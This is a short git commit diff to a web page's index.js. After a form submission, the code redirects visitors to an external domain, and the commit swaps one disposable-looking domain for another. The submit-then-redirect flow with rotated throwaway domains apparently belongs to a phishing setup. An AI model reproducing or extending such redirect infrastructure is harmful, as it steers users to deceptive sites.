88da835180736612affafaf36ff32b0f858e4975
husknet <127146284+husknet@users.noreply.github.com>
2024-11-14 16:00:02 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://je.logbook-annul-srt.click';
+        window.location.href = 'https://jy.sg.loline-sps.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
